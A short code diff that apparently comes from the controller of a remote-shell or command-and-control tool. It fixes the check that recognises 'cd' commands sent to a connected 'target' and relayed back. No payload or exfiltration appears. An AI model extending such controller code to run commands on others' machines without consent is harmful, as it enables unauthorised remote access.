@@ -70,7 +70,7 @@ class Server:
 				self.target.send(command.encode(self.format))
 				if command=="clear" or command=='cls':
 					Server.clear_screen()
-				elif command[:3] == "cd":
+				elif command[:2] == "cd":
 					print(self.target.recv(1024).decode(self.format))
 				elif command == "hardware --check":
 					print(self.target.recv(1024).decode(self.format))
